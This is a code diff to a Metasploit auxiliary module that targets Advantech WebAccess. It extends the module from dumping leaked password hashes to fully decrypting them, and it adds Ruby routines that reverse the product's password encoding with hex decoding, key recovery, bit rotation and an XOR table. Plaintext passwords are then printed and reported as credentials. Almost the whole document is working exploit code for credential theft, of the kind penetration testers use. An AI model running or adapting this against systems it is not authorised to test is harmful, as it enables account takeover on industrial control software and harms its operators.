@@ -114,9 +114,9 @@ class Metasploit3 < Msf::Auxiliary
       if i < (strings_length / 3)
         @users.push(result)
       elsif i < (strings_length / 3) * 2
-        @passwords.push(result)
+        @enc_passwords.push(result)
       else
-        @passwords2.push(result)
+        @keys.push(result)
       end
       i = i + 1
     end
@@ -143,8 +143,9 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     @users = []
-    @passwords = []
-    @passwords2 = []
+    @enc_passwords = []
+    @keys = []
+    @plain_passwords = []
 
     print_status("#{peer} - Parsing extracted data...")
     parse_users(data, mark)
@@ -159,26 +160,125 @@ class Metasploit3 < Msf::Auxiliary
     users_table = Rex::Ui::Text::Table.new(
       'Header'  => 'Advantech WebAccess Users',
       'Ident'   => 1,
-      'Columns' => ['Username', 'Password Hash', 'Password Hash 2']
+      'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password']
     )
 
     for i in 0..@users.length - 1
+      @plain_passwords[i] = decrypt_password(@enc_passwords[i], @keys[i])
+      @plain_passwords[i] = "(blank password)" if @plain_passwords[i].empty?
       report_auth_info({
        :host => rhost,
        :port => rport,
        :user => @users[i],
-       :pass => "#{@passwords[i]}:#{@passwords2[i]}",
-       :type => "hash",
+       :pass => @plain_passwords[i],
+       :type => "password",
        :sname => (ssl ? "https" : "http"),
-       :proof => data # Using proof to store the hash salt
+       :proof => "Leaked encrypted password: #{@enc_passwords[i]}:#{@keys[i]}"
       })
-      users_table << [@users[i], @passwords[i], @passwords2[i]]
+      users_table << [@users[i], @enc_passwords[i], @keys[i], @plain_passwords[i]]
     end
 
     print_line(users_table.to_s)
-
   end
 
+  def decrypt_password(password, key)
+    recovered_password = recover_password(password)
+    recovered_key = recover_key(key)
+
+    recovered_bytes = decrypt_bytes(recovered_password, recovered_key)
+    password = []
+
+    recovered_bytes.each { |b|
+      if b == 0
+        break
+      else
+        password.push(b)
+      end
+    }
+
+    return password.pack("C*")
+  end
+
+  def recover_password(password)
+    bytes = password.unpack("C*")
+    recovered = []
+
+    i = 0
+    j = 0
+    while i < 16
+      low = bytes[i]
+
+      if low < 0x41
+        low = low - 0x30
+      else
+        low = low - 0x37
+      end
+
+      low = low * 16
+
+      high = bytes[i+1]
+      if high < 0x41
+        high = high - 0x30
+      else
+        high = high - 0x37
+      end
+
+      recovered_byte = low + high
+
+      recovered[j] = recovered_byte
+
+      i = i + 2
+      j = j + 1
+    end
+
+    recovered
+  end
+
+  def recover_key(key)
+    bytes = key.unpack("C*")
+    recovered = 0
+
+    bytes[0, 8].each { |b|
+      recovered = recovered * 16
+      if b < 0x41
+        byte_weight = b - 0x30
+      else
+        byte_weight = b - 0x37
+      end
+
+      recovered = recovered + byte_weight
+    }
+
+    recovered
+  end
+
+  def decrypt_bytes(bytes, key)
+    result = []
+    xor_table = [0xaa, 0xa5, 0x5a, 0x55]
+    key_copy = key
+    for i in 0..7
+      byte = (crazy(bytes[i] ,8 - (key & 7)) & 0xff)
+      result.push(byte ^ xor_table[key_copy & 3])
+      key_copy = key_copy / 4
+      key = key / 8
+    end
+
+    result
+  end
+
+  def crazy(byte, magic)
+    result = byte & 0xff
+
+    while magic > 0
+      result = result * 2
+        if result & 0x100 == 0x100
+          result = result + 1
+        end
+        magic = magic - 1
+    end
+
+    result
+  end
 
 end
 
